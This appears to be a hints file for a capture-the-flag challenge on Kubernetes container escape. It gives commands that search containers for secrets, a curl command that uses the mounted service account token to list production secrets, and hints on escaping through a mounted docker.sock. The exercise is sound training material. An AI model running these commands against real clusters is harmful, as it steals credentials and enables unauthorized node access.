# CTF Hints
## Stage 1: Container Reconnaissance
<details>
<summary>Hint 1</summary>
Check environment variables and common secret locations (/var/run/secrets, /app/secrets, /config)
</details>

<details>
<summary>Hint 2</summary>
The command `env | grep -i secret` and `find / -name "*secret*" 2>/dev/null` are your friends
</details>

## Stage 2: Kubernetes API
<details>
<summary>Hint 1</summary>
Service account tokens are automatically mounted. Check /var/run/secrets/kubernetes.io/serviceaccount/
</details>

<details>
<summary>Hint 2</summary>
Use curl with the service account token to query kubernetes.default.svc
</details>

<details>
<summary>Hint 3</summary>
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/production/secrets
```
</details>

## Stage 3: Privilege Escalation
<details>
<summary>Hint 1</summary>
One of the containers is running as privileged. Check `cat /proc/self/status | grep Cap`
</details>

<details>
<summary>Hint 2</summary>
Look for docker.sock mounts: `ls -la /var/run/docker.sock`
</details>
<details>
<summary>Hint 3</summary>
With access to docker.sock, you can break out of the container and access the node filesystem.
</details>
